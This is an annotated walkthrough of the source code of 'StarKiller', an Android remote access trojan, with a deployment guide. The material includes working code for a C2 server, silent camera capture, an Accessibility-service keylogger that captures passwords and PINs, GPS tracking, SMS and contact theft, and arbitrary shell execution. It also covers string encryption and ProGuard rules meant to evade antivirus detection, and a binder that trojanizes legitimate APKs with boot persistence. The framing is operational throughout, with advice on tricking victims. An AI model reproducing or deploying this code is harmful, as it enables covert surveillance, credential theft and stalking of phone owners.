# STARKILLER — Annotated Code Walkthrough

22DIV / george wu

---

## Architecture Overview

StarKiller is a two-component Android RAT: a Python C2 server and a Kotlin Android client. Communication uses a custom TCP protocol — 4-byte big-endian length prefix followed by a UTF-8 JSON payload. The server exposes an HTTP dashboard for operator control. The client runs as a foreground service with exponential-backoff reconnection, dispatching tasks through a router to specialized hardware/data modules.

```
Operator (browser) ──HTTP──▶ C2 Server ◀──TCP──▶ Android Agent
   :8666 dashboard            :8667 listener       StarKillerService
                                                     └─ TaskRouter
                                                        ├─ CameraCapture
                                                        ├─ MicRecorder
                                                        ├─ GpsTracker
                                                        ├─ KeyLogService
                                                        ├─ SmsModule
                                                        ├─ ContactsDump
                                                        ├─ FileManager
                                                        ├─ ScreenCapture
                                                        ├─ CallLogReader
                                                        ├─ AppList
                                                        └─ DeviceInfo
```

---

## 1. C2 Server — `server/starkiller_c2.py`

**Path**: `server/starkiller_c2.py`
**Purpose**: Command-and-control server. Accepts agent connections over TCP, provides a web dashboard over HTTP, dispatches tasks, receives results and exfiltrated files.

### Key Technique

Dual-listener architecture. The agent TCP listener runs in a background thread on `:8667`. The HTTP dashboard runs on `:8666` in the main thread. Both share agent state through a `dict` guarded by `threading.Lock`. Each connected agent gets its own handler thread, so multiple agents operate concurrently.

The wire protocol is dead simple and effective: 4-byte big-endian length header, then JSON body. Max payload is 10MB (guards against memory exhaustion from malformed headers).

### Critical Code — Wire Protocol

```python
def agent_send(sock, data):
    raw = json.dumps(data).encode("utf-8")
    sock.sendall(struct.pack(">I", len(raw)) + raw)

def agent_recv(sock):
    hdr = b""
    while len(hdr) < 4:
        chunk = sock.recv(4 - len(hdr))
        if not chunk:
            return None
        hdr += chunk
    length = struct.unpack(">I", hdr)[0]
    if length > 10 * 1024 * 1024:
        return None
    body = b""
    while len(body) < length:
        chunk = sock.recv(min(65536, length - len(body)))
        if not chunk:
            return None
        body += chunk
    return json.loads(body.decode("utf-8"))
```

### Critical Code — Agent Registration and Message Routing

```python
def agent_handler(sock, addr):
    msg = agent_recv(sock)
    if not msg or msg.get("type") != "register":
        sock.close()
        return

    agent_id = msg.get("agent_id", uuid.uuid4().hex[:8])
    # ...store agent info with metadata (model, carrier, battery, IMEI)...

    while True:
        msg = agent_recv(sock)
        if msg is None:
            break
        msg_type = msg.get("type", "")

        if msg_type == "heartbeat":
            # update last_seen, battery, GPS
        elif msg_type == "result":
            # log task completion, update GPS from location results
        elif msg_type == "file_data":
            # base64-decode and write to downloads/
```

### Operational Significance

- **Protocol agnostic to agent platform**: the handler checks for `"android"` or `"windows"` in the registration message. This means the same C2 can manage VADER Windows agents and StarKiller Android agents simultaneously.
- **Stale agent pruning**: agents disconnected for >300 seconds are removed from the agent list on the next API poll.
- **File exfiltration**: `file_data` messages are base64-decoded and written directly to `downloads/` — camera captures, mic recordings, and file downloads all flow through this path.
- **Dashboard is a single HTML string embedded in the Python source** — no external files, no dependencies, zero deployment friction. Console polls at 400ms, agent list at 2s.

---

## 2. Encrypted Config — `client/.../Config.kt`

**Path**: `client/app/src/main/kotlin/com/starkiller/agent/Config.kt`
**Purpose**: Stores C2 connection parameters. The host and app name are encrypted at rest so they don't appear as plaintext strings in the compiled DEX.

### Key Technique

Computed properties (`get()`) that call `Crypt.d()` at runtime instead of `const val`. This means the JVM/ART can't inline the string values — they only exist in memory after the XOR decryption runs. The encrypted blobs are base64-encoded ciphertext baked in at build time by `obfuscate.py`.

### Critical Code

```kotlin
object Config {
    val C2_HOST: String get() = Crypt.d("a2Juc29pWHRqcmxubw==")
    const val C2_PORT = 8667
    const val RECONNECT_BASE_MS = 5000L
    const val RECONNECT_MAX_MS = 300000L
    const val HEARTBEAT_INTERVAL_MS = 30000L
    val APP_NAME: String get() = Crypt.d("CSIvKTsyQAk+Lis3PAU=")
    const val HIDE_ICON = false
}
```

### Operational Significance

- `C2_HOST` and `APP_NAME` use `val ... get()` — dynamic. Port and timing use `const val` — static, inlined by the compiler. This is deliberate: the port is a number (not suspicious as a string), but the IP address and app name would be immediately visible in a `strings` dump of the APK.
- `RECONNECT_MAX_MS = 300000L` — 5-minute ceiling on backoff. Aggressive enough to re-establish contact without hammering the C2 during downtime.

---

## 3. XOR Cipher — `client/.../Crypt.kt`

**Path**: `client/app/src/main/kotlin/com/starkiller/agent/Crypt.kt`
**Purpose**: Symmetric string encryption/decryption using XOR with a rolling offset.

### Key Technique

XOR with key `0x5A`, but the effective key changes per byte position: `(KEY + i % 7)`. The modulo-7 rolling offset means the cipher isn't a simple single-byte XOR — it has a 7-byte repeating key cycle, making frequency analysis slightly harder. Input/output is base64-encoded for safe transport as string literals.

### Critical Code

```kotlin
object Crypt {
    private const val KEY: Byte = 0x5A

    fun d(encoded: String): String {
        val raw = Base64.decode(encoded, Base64.NO_WRAP)
        val out = ByteArray(raw.size)
        for (i in raw.indices) {
            out[i] = (raw[i].toInt() xor (KEY.toInt() + i % 7)).toByte()
        }
        return String(out, Charsets.UTF_8)
    }
```

### Operational Significance

- This is not cryptographically strong — it's anti-static-analysis, not anti-reverse-engineering. The goal is to defeat automated `strings` extraction and simple YARA rules, not a determined analyst.
- The key and algorithm are in the APK, so anyone who decompiles can write a decoder. The value is in raising the cost from "grep" to "reverse-engineer the Crypt class."
- The `e()` (encrypt) function uses the same XOR operation — XOR is its own inverse. Python-side mirror in `obfuscate.py` uses identical logic for build-time encryption.

---

## 4. TCP Client — `client/.../C2Client.kt`

**Path**: `client/app/src/main/kotlin/com/starkiller/agent/C2Client.kt`
**Purpose**: Manages the TCP socket to the C2. Handles registration, heartbeats, result delivery, file uploads, and the task receive loop.

### Key Technique

All string keys in the JSON protocol (`"type"`, `"register"`, `"agent_id"`, etc.) are encrypted with `Crypt.d()` — they never appear as plaintext in the DEX bytecode. The method `k()` is a one-character alias for `Crypt.d()`, keeping the code compact.

The send path is `@Synchronized` to prevent interleaved writes from concurrent threads (heartbeat thread vs. task result thread). The receive loop runs blocking I/O with the same length-prefixed protocol as the server.

### Critical Code — Registration with Encrypted Keys

```kotlin
private fun k(e: String) = Crypt.d(e)

private fun register() {
    val info = JSONObject().apply {
        put(k("LiIsOA=="), k("KD47NC0rBSg="))     // "type" -> "register"
        put(k("Ozw5MyoACT4="), agentId)             // "agent_id"
        put(k("MjQvKTA+DT8="), Build.MODEL)         // "hostname"
        put(k("NSg="), "Android ${Build.VERSION.RELEASE}")  // "os"
        put(k("Kjc9KTgwEjc="), "android")           // "platform"
        put(k("NzQ4ODI="), "${Build.MANUFACTURER} ${Build.MODEL}")  // "model"
        put(k("KT83"), Build.VERSION.SDK_INT)        // "sdk"
    }
    sendMsg(info)
}
```

### Critical Code — Synchronized Wire Write

```kotlin
@Synchronized
private fun sendMsg(data: JSONObject) {
    val bytes = data.toString().toByteArray(Charsets.UTF_8)
    val header = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(bytes.size).array()
    output?.write(header)
    output?.write(bytes)
    output?.flush()
}
```

### Operational Significance

- The `receiveLoop()` checks for `type == "task"` before dispatching — anything that isn't a task message is silently dropped. This prevents the C2 from accidentally triggering behaviour with malformed messages.
- Agent ID is a random 8-character UUID substring — short enough for dashboard display, random enough to avoid collisions.
- `soTimeout = 0` and `keepAlive = true` on the socket — the connection stays open indefinitely. The server detects disconnection when `recv` returns null/empty.

---

## 5. Foreground Service — `client/.../StarKillerService.kt`

**Path**: `client/app/src/main/kotlin/com/starkiller/agent/StarKillerService.kt`
**Purpose**: Android Service that keeps the agent alive. Manages the connection lifecycle, heartbeats, wake lock, and foreground notification.

### Key Technique

Exponential backoff reconnection. On disconnect, the service waits `reconnectDelay` ms (starts at 5s), then doubles it on each failure up to 300s (5 minutes). On successful connection, it resets to 5s. This prevents the agent from hammering a dead C2 but ensures fast reconnection when the server comes back.

`START_STICKY` return from `onStartCommand` tells Android to restart the service if the system kills it — persistence without the boot receiver.

### Critical Code — Reconnection Loop

```kotlin
private fun connectionLoop() {
    while (running) {
        try {
            client.connect()
            reconnectDelay = Config.RECONNECT_BASE_MS   // reset on success
            startHeartbeat()
            client.receiveLoop()                         // blocks until disconnect
        } catch (_: Exception) {}

        client.disconnect()
        if (!running) break

        try {
            Thread.sleep(reconnectDelay)
        } catch (_: InterruptedException) { break }

        reconnectDelay = min(reconnectDelay * 2, Config.RECONNECT_MAX_MS)  // backoff
    }
}
```

### Critical Code — Wake Lock Acquisition

```kotlin
private fun acquireWakeLock() {
    val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
    wakeLock = pm.newWakeLock(
        PowerManager.PARTIAL_WAKE_LOCK,
        "starkiller:c2wakelock"
    ).apply { acquire() }
}
```

### Operational Significance

- **`PARTIAL_WAKE_LOCK`** keeps the CPU running even when the screen is off. Without this, Android Doze mode would suspend the TCP connection.
- **`IMPORTANCE_LOW` notification** — the foreground notification is required by Android (post-API 26) but uses low importance so it's minimally visible.
- The executor pool has 3 threads: one for the connection loop, one for the heartbeat scheduler, one spare. This keeps the agent lightweight.
- The heartbeat fires every 30 seconds — frequent enough for the C2 to detect lost connections within a minute, infrequent enough to avoid battery drain suspicion.

---

## 6. Task Router — `client/.../TaskRouter.kt`

**Path**: `client/app/src/main/kotlin/com/starkiller/agent/TaskRouter.kt`
**Purpose**: Central dispatch for all C2 commands. Receives a task JSON, routes it to the appropriate module, returns the result to the C2.

### Key Technique

`when` expression dispatch with lazy-initialized modules. Each module is constructed only when first needed (`by lazy {}`), so the agent doesn't initialize the camera subsystem until a camera task arrives. The dispatch runs on a 4-thread executor pool — up to 4 tasks can execute concurrently.

### Critical Code — Operation Dispatch

```kotlin
fun dispatch(task: JSONObject) {
    executor.submit {
        val op = task.optString("op", "")
        val taskId = task.optString("task_id", "unknown")
        try {
            val result = when (op) {
                "sysinfo"    -> deviceInfo.collect()
                "camera"     -> cameraCapture.capture(task.optString("facing", "rear"))
                "sms_read"   -> smsModule.readAll()
                "gps"        -> gpsTracker.getLocation()
                "contacts"   -> contactsDump.dump()
                "mic"        -> micRecorder.record(task.optInt("duration", 10))
                "screenshot" -> screenCapture.capture()
                "calllog"    -> callLogModule.read()
                "apps"       -> appList.installed()
                "exec"       -> {
                    val cmd = task.getString("command")
                    val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
                    // ...capture stdout, stderr, exit code...
                }
                "recon"      -> {
                    // sysinfo + GPS + app list in one shot
                }
                "exit"       -> { service.stopSelf(); return@submit }
                else         -> JSONObject().put("error", "unknown op: $op")
            }
            client.sendResult(taskId, result)
        } catch (e: Exception) {
            client.sendResult(taskId, JSONObject().put("error", e.message))
        }
    }
}
```

### Operational Significance

- **`exec` is raw shell execution**: `Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))`. This gives the C2 arbitrary command execution on the device. Every other operation is just a convenience wrapper around something `exec` could do, but the dedicated modules are quieter and more reliable.
- **`recon` is a compound operation**: device info + GPS + installed apps in one task dispatch. Single button press on the dashboard, three data collection modules fire sequentially.
- **Error isolation**: each task runs in a try/catch — a failing camera capture doesn't kill the agent or break the receive loop.

---

## 7. Key Modules

### 7a. CameraCapture — `client/.../modules/CameraCapture.kt`

**Path**: `client/app/src/main/kotlin/com/starkiller/agent/modules/CameraCapture.kt`
**Purpose**: Silent camera capture using Camera2 API. Takes a JPEG still from front or rear camera without any UI or shutter sound.

### Key Technique

Uses `CameraDevice.TEMPLATE_STILL_CAPTURE` through Camera2 API — no preview surface, no SurfaceView, no visible UI. The `ImageReader` captures directly to a JPEG byte buffer at 640x480. A `CountDownLatch` synchronises the async Camera2 callbacks into a blocking call with a 10-second timeout.

### Critical Code

```kotlin
val reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
reader.setOnImageAvailableListener({ r ->
    val image = r.acquireLatestImage()
    if (image != null) {
        val buffer = image.planes[0].buffer
        imageData = ByteArray(buffer.remaining())
        buffer.get(imageData!!)
        image.close()
        latch.countDown()
    }
}, handler)

// Open camera silently — no preview, no UI
cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
    override fun onOpened(camera: CameraDevice) {
        camera.createCaptureSession(listOf(reader.surface),
            object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    req.addTarget(reader.surface)
                    session.capture(req.build(), /* ... */)
                }
            }, handler)
    }
}, handler)
```

### Operational Significance

- **640x480 resolution is deliberate** — small enough to base64-encode and send over a potentially slow mobile connection, large enough to be identifiable. Higher resolutions would increase exfiltration time and memory pressure.
- **No shutter sound** — Camera2 API with `TEMPLATE_STILL_CAPTURE` and no `MediaActionSound` call. On some OEMs this still plays a shutter noise (legally mandated in Japan/Korea), but most devices are silent.
- **`HandlerThread` for camera callbacks** — Camera2 requires a `Handler` on a looper thread. Creating a dedicated thread prevents blocking the main thread or the task executor.

---

### 7b. KeyLogService — `client/.../modules/KeyLogService.kt`

**Path**: `client/app/src/main/kotlin/com/starkiller/agent/modules/KeyLogService.kt`
**Purpose**: Accessibility Service that captures text input events across all apps on the device.

### Key Technique

Extends `AccessibilityService` — once the user enables it in Settings > Accessibility, Android feeds every `TYPE_VIEW_TEXT_CHANGED` event to `onAccessibilityEvent()`. Each event contains the current text content of the focused input field and the package name of the app. Entries are stored in a `ConcurrentLinkedQueue` (thread-safe, lock-free) with a 5000-entry cap.

### Critical Code

```kotlin
class KeyLogService : AccessibilityService() {
    companion object {
        val buffer = ConcurrentLinkedQueue<String>()
        private const val MAX_BUFFER = 5000

        fun drain(): List<String> {
            val entries = mutableListOf<String>()
            while (buffer.isNotEmpty() && entries.size < MAX_BUFFER) {
                buffer.poll()?.let { entries.add(it) }
            }
            return entries
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text?.joinToString("") ?: return
                val pkg = event.packageName?.toString() ?: "unknown"
                val entry = "${System.currentTimeMillis()}|$pkg|$text"
                if (buffer.size < MAX_BUFFER) buffer.add(entry)
            }
        }
    }
}
```

### Operational Significance

- **This is the most invasive module.** Accessibility Services see everything typed in every app — passwords, messages, search queries, banking PINs. The `companion object` buffer means the `TaskRouter` can call `KeyLogService.drain()` to pull accumulated entries without a service binding.
- **Format**: `timestamp|package_name|text` — tells the operator exactly when, in which app, and what was typed.
- **Requires user action to enable** — Android won't auto-grant Accessibility Service permission. A social engineering component (the "System Update" app name in Config) is needed to get the victim to enable it.
- **`MAX_BUFFER = 5000`** prevents OOM on the device if keylog data isn't collected for a while.

---

### 7c. GpsTracker — `client/.../modules/GpsTracker.kt`

**Path**: `client/app/src/main/kotlin/com/starkiller/agent/modules/GpsTracker.kt`
**Purpose**: Gets the device's GPS coordinates. Falls back from GPS to network provider. Returns lat/lon/altitude/accuracy/speed/bearing.

### Key Technique

Three-tier location strategy: (1) try `getLastKnownLocation` from GPS provider — instant if a recent fix exists, (2) try `getLastKnownLocation` from network provider — coarser but more likely to have a cached value, (3) request a fresh single fix with a 15-second timeout using `CountDownLatch`. This means the module returns in milliseconds when cached data is available, or blocks up to 15 seconds for a fresh fix.

### Critical Code

```kotlin
@SuppressLint("MissingPermission")
fun getLocation(): JSONObject {
    val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager

    // Try cached location first — instant return
    val last = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
    if (last != null) return locationToJson(last)

    // No cache — request fresh fix with timeout
    val latch = CountDownLatch(1)
    var result: Location? = null
    val listener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            result = location
            latch.countDown()
            lm.removeUpdates(this)
        }
    }

    lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, null)
    latch.await(15, TimeUnit.SECONDS)
    lm.removeUpdates(listener)
```

### Operational Significance

- **`requestSingleUpdate` instead of `requestLocationUpdates`** — requests exactly one fix, then deregisters. This is battery-friendly and avoids the GPS icon staying on.
- **15-second timeout is aggressive** — cold GPS fix can take 30-60 seconds. The module trades accuracy for responsiveness; a stale cached location is better than a task that hangs.
- **`@SuppressLint("MissingPermission")`** — the permission check is handled at the manifest/runtime level, not in this module. The lint suppression acknowledges the module trusts the caller to have already obtained `ACCESS_FINE_LOCATION`.

---

## 8. Obfuscation Pipeline — `obfuscate.py`

**Path**: `obfuscate.py`
**Purpose**: Four-phase build hardening: string encryption, ProGuard rule generation, manifest sanitisation, and YARA-style detection scanning.

### Key Technique

Mirrors the Kotlin `Crypt.kt` XOR cipher exactly in Python — same key `0x5A`, same `(key + i % 7)` rolling offset. This means `obfuscate.py encrypt "192.168.1.96"` produces the same ciphertext that `Crypt.d()` in the APK will decode. The detection scanner runs a poor-man's YARA: byte-pattern matching against known RAT indicators.

### Critical Code — Python-side Encryption (mirrors Crypt.kt)

```python
KEY = 0x5A

def encrypt_string(plain):
    raw = plain.encode("utf-8")
    out = bytearray(len(raw))
    for i in range(len(raw)):
        out[i] = raw[i] ^ (KEY + i % 7)
    return base64.b64encode(bytes(out)).decode("ascii")
```

### Critical Code — Detection Signature Scanner

```python
def scan_file_for_signatures(filepath):
    with open(filepath, "rb") as f:
        data = f.read()

    rat_strings = [
        (b"C2_HOST", "Config string 'C2_HOST' visible in plaintext"),
        (b"starkiller", "Project name 'starkiller' visible"),
        (b"keylog", "Keyword 'keylog' visible"),
        (b"heartbeat", "Protocol keyword 'heartbeat' visible"),
        (b"agent_id", "Protocol keyword 'agent_id' visible"),
    ]
    # ...also checks for hardcoded IPs, port 8667, excessive permissions,
    #    and dual Accessibility+NotificationListener service abuse...
```

### Critical Code — ProGuard Hardening Rules

```python
def generate_proguard_rules():
    return """-optimizationpasses 5
-allowaccessmodification
-mergeinterfacesaggressively
-overloadaggressively
-repackageclasses ''

# Remove logging
-assumenosideeffects class android.util.Log {
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
    public static int e(...);
}"""
```

### Operational Significance

- **`full` subcommand runs the complete pipeline**: encrypt config, write ProGuard rules, scan source pre-build, scan APK binary post-build. One command, four phases.
- **The detection scanner is adversarial self-assessment** — it looks for the same patterns that AV/MDM solutions would flag. If the scanner reports findings, the APK needs more obfuscation work before deployment.
- **ProGuard config is aggressive**: 5 optimization passes, repackages all classes to the root package (empty string), strips all `Log.*` calls at compile time, merges interfaces. This makes decompiled output significantly harder to read.
- **The scanner checks for 7 dangerous permissions coexisting** — exactly the pattern that Google Play Protect and commercial MDM flag as "likely RAT."

---

## 9. APK Binder — `binder.py`

**Path**: `binder.py`
**Purpose**: Injects the StarKiller payload into a legitimate APK. The output looks and functions like the original app, but starts the C2 service on launch.

### Key Technique

Six-stage pipeline: (1) decompile target APK to Smali with `apktool`, (2) copy payload Smali classes into the decompiled tree, (3) patch `AndroidManifest.xml` to add permissions + service + boot receiver, (4) inject a `startPayload()` call into the target app's main activity `onCreate`, (5) repackage with `apktool`, (6) re-sign with `uber-apk-signer` or `jarsigner`.

The startup hook is Smali injection — it adds a method call to the decompiled launcher activity that starts `StarKillerService` via `startForegroundService()`.

### Critical Code — Smali Service Start Injection

```smali
.method private startPayload()V
    .locals 2
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/starkiller/agent/StarKillerService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method
```

### Critical Code — Manifest Patching

```python
for perm in REQUIRED_PERMISSIONS:
    if perm not in content:
        perm_line = f'    <uses-permission android:name="{perm}" />\n'
        content = content.replace("<application", perm_line + "    <application", 1)

service_block = '''
    <service android:name="com.starkiller.agent.StarKillerService"
        android:exported="false" android:foregroundServiceType="dataSync" />
    <receiver android:name="com.starkiller.agent.persistence.BootReceiver"
        android:exported="true" android:enabled="true">
        <intent-filter>
            <action android:name="android.intent.action.BOOT_COMPLETED" />
        </intent-filter>
    </receiver>'''
```

### Operational Significance

- **The hook targets the first `return-void` in the launcher activity's `onCreate`** — this means the payload starts as soon as the user opens the bound app, before the original app's `onCreate` finishes.
- **Boot receiver ensures persistence** — `BOOT_COMPLETED` fires after every reboot, restarting the service without user interaction.
- **`android:debuggable="true"` is automatically stripped** to `false` — prevents easy debugging of the bound APK.
- **Post-bind detection scan runs automatically** — after building, the binder imports `obfuscate.scan_file_for_signatures` and reports any YARA-style hits in the output APK.
- **18 permissions are injected**, including `READ_SMS`, `SEND_SMS`, `CAMERA`, `RECORD_AUDIO`, `ACCESS_FINE_LOCATION`, `READ_CONTACTS`, `READ_CALL_LOG`, and `RECEIVE_BOOT_COMPLETED`.

---

## 10. Build Automation — `build.py`

**Path**: `build.py`
**Purpose**: One-command APK build. Injects C2 config, runs Gradle, copies the output APK, optionally installs via ADB.

### Key Technique

Direct `Config.kt` file generation — writes a new Kotlin source file with the C2 IP, port, and app name hardcoded as string constants (the plaintext version, not encrypted — this is the "fast build" path). For obfuscated builds, `obfuscate.py config` should be used instead.

Sets `ANDROID_SDK_ROOT` and writes `local.properties` to point at the project-local SDK directory, making the build self-contained.

### Critical Code — Config Injection

```python
def inject_config(ip, port, app_name, hide_icon):
    config = f'''package com.starkiller.agent

object Config {{
    const val C2_HOST = "{ip}"
    const val C2_PORT = {port}
    const val APP_NAME = "{app_name}"
    const val HIDE_ICON = {str(hide_icon).lower()}
    const val RECONNECT_DELAY = 10_000L
    const val HEARTBEAT_INTERVAL = 30_000L
}}'''
    with open(CONFIG_FILE, "w") as f:
        f.write(config)
```

### Operational Significance

- **Two build paths exist**: `build.py` for rapid iteration (plaintext config, fast), `obfuscate.py full` for deployment (encrypted config, ProGuard, detection scan).
- **`--install` flag chains ADB install** — build and deploy to a connected device in one command.
- **`--hide-icon` sets the flag** that makes the launcher activity hide itself after first launch.
- **Debug vs. release builds**: debug is default (no signing needed), release requires proper keystore setup.
- The build output goes to `payloads/starkiller-{variant}.apk` — consistent location for the binder and detection scanner to find.

---

## 11. Test Harness — `test_agents.py`

**Path**: `test_agents.py`
**Purpose**: Spawns N fake Android agents that connect to the C2, register with realistic device profiles, heartbeat, and respond to all task types with synthetic data. For testing the C2 without real devices.

### Key Technique

Each `FakeAgent` is a `threading.Thread` that mirrors the real agent's protocol exactly: register with device info, start a heartbeat loop (10-second interval), then enter a receive loop handling tasks. Device profiles use real Australian carriers (Telstra, Optus, Vodafone, Boost) and real phone models (Galaxy S24, Pixel 8, OnePlus 12, etc.).

GPS coordinates jitter around central Sydney (`-33.8688, 151.2093`) with small random offsets — the C2 dashboard sees "moving" agents.

### Critical Code — Fake Device Profiles

```python
FAKE_DEVICES = [
    {"model": "Samsung Galaxy S24", "manufacturer": "samsung", "android": "14", "sdk": 34, "carrier": "Telstra"},
    {"model": "Google Pixel 8", "manufacturer": "Google", "android": "14", "sdk": 34, "carrier": "Optus"},
    {"model": "OnePlus 12", "manufacturer": "OnePlus", "android": "14", "sdk": 34, "carrier": "Vodafone"},
    {"model": "Xiaomi 14", "manufacturer": "Xiaomi", "android": "14", "sdk": 34, "carrier": "Boost"},
    # ...4 more...
]
```

### Critical Code — Task Response Simulation

```python
def handle_task(self, task):
    op = task.get("op", "")
    if op == "sysinfo":
        result = {"manufacturer": self.dev["manufacturer"], "model": self.dev["model"],
                  "battery": self.battery, ...}
    elif op == "gps":
        self.lat += random.uniform(-0.001, 0.001)  # GPS drift
        result = {"latitude": self.lat, "longitude": self.lon, ...}
    elif op == "exec":
        result = {"stdout": f"[simulated] {cmd}\n", "exit_code": 0}
    # ...handles all 15 operation types...
```

### Operational Significance

- **Full protocol fidelity** — the test agents use the same `send_msg`/`recv_msg` wire format as the real Kotlin client. If the C2 works with test agents, it works with real agents.
- **Battery drain simulation** — `self.battery = max(1, self.battery - random.randint(0, 2))` decrements battery on each heartbeat. The dashboard shows battery levels dropping over time, just like real devices.
- **GPS drift** — coordinates change by ~0.001 degrees per GPS request, simulating a moving device.
- **Stagger spawn** — agents connect with 300ms delays (`time.sleep(0.3)`) to avoid socket contention, mimicking real-world connections arriving at different times.
- **Usage**: `python test_agents.py [host] [port] [count]` — defaults to 4 agents on localhost:8667.

---

## Protocol Summary

```
Agent → C2:
  REGISTER    {"type":"register", "agent_id":"abc12345", "hostname":"Pixel 8", "os":"Android 14", "platform":"android", ...}
  HEARTBEAT   {"type":"heartbeat", "agent_id":"abc12345", "battery":87, "last_gps":"-33.8688,151.2093"}
  RESULT      {"type":"result", "agent_id":"abc12345", "task_id":"a1b2c3", "data":{...}}
  FILE_DATA   {"type":"file_data", "agent_id":"abc12345", "task_id":"a1b2c3", "filename":"photo.jpg", "data":"<base64>"}
  OUTPUT      {"type":"output", "agent_id":"abc12345", "line":"..."}

C2 → Agent:
  TASK        {"type":"task", "task_id":"a1b2c3", "op":"camera", "facing":"front"}
```

All messages use 4-byte big-endian length prefix + UTF-8 JSON body. Max 10MB.

---

## Build + Deploy Flow

```
1. obfuscate.py config --ip X.X.X.X    →  encrypted Config.kt
2. obfuscate.py proguard               →  hardened proguard-rules.pro
3. build.py --ip X.X.X.X --install     →  APK built, ADB installed
   OR
   binder.py legit_app.apk             →  payload injected into carrier app
4. obfuscate.py scan payloads/          →  detection signature check
5. starkiller_c2.py                     →  C2 live on :8666/:8667
6. test_agents.py                       →  validate without real device
```
